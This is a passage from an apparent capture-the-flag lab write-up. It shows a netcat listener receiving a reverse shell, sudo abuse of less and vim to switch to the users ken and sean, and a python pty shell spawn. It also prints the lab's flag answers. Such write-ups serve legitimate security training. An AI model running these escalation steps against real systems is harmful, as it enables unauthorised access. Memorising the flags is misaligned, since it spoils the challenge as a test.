    $ nc -lnvp 9998                                                                                                                                 1 ⨯
    listening on [any] 9998 ...
    connect to [10.11.25.205] from (UNKNOWN) [10.10.123.13] 59892
    bash: /home/dalia/.bashrc: Permission denied
    jordan@linuxagency:/tmp/shop$
    jordan@linuxagency:~$ ls -la
    ls -la
    total 40
    drwxr-x---  3 jordan jordan 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root   root   4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 jordan jordan    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 jordan jordan  220 Jan 12 04:02 .bash_logout
    -rw-r--r--  1 jordan jordan 3771 Jan 12 04:02 .bashrc
    -rw-r--r--  1 jordan jordan 8980 Jan 12 04:02 examples.desktop
    -rw-------  1 jordan jordan   41 Jan 12 04:02 flag.txt
    drwxr-xr-x  3 jordan jordan 4096 Jan 12 04:02 .local
    -rw-r--r--  1 jordan jordan  807 Jan 12 04:02 .profile
    -rw-------  1 jordan jordan    0 Jan 12 04:02 .python_history
    jordan@linuxagency:~$ cat flag.txt
    cat flag.txt
    }3c3e9f8796493b98285b9c13c3b4cbcf{nadroj
    jordan@linuxagency:~$ rev flag.txt
    rev flag.txt
    jordan{fcbc4b3c31c9b58289b3946978f9e3c3}
    ```

- What is ken's flag?

    ```bash
    jordan@linuxagency:~$ sudo -l
    sudo -l
    Matching Defaults entries for jordan on localhost:
        env_reset, env_file=/etc/sudoenv, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User jordan may run the following commands on localhost:
        (ken) NOPASSWD: /usr/bin/less
    jordan@linuxagency:~$ sudo -u ken less /etc/profile
    sudo -u ken less /etc/profile
    $ whoami
    whoami
    ken
    ken@linuxagency:~$ export HOME=/home/ken
    export HOME=/home/ken
    ken@linuxagency:/home/jordan$ cd ~
    cd ~
    ken@linuxagency:~$ cat flag
    cat flag.txt 
    ken{4115bf456d1aaf012ed4550c418ba99f}
    ```

- What is sean's flag?
```bash
ken@linuxagency:~$ sudo -l
sudo -l
Matching Defaults entries for ken on localhost:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ken may run the following commands on localhost:
    (sean) NOPASSWD: /usr/bin/vim
ken@linuxagency:~$ sudo -u sean vim -c ':!/bin/sh'
sudo -u sean vim -c ':!/bin/sh'

$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
bash: /home/ken/.bashrc: Permission denied
sean@linuxagency:~$
```

